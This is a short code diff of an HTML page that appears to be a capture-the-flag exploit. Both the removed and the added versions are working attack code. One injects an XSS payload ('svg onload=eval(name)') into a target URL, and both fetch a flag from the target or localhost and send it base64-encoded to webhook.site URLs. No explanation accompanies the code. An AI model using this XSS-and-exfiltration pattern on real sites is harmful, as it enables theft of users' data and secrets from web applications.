@@ -1,13 +1,12 @@
-<!DOCTYPE html>
 <html>
   <body>
+    <h1>Loading...</h1>
     <script>
-      window.name = `
-        fetch('/readflag')
-          .then(r => r.text())
-          .then(t => location='https://webhook.site/ff3174aa-d1d3-445f-af2a-85354206317b?flag='+btoa(t))
-      `;
-      location = 'http://cat.chummy.tw:29999/?user=%3Csvg/onload=eval(name)%3E';
+      fetch("http://127.0.0.1:5000/flag")
+        .then(res => res.text())
+        .then(data => {
+          fetch("https://webhook.site/ba5ed2dc-0a06-4151-84dd-432789909b1c?data=" + btoa(data));
+        });
     </script>
   </body>
 </html>
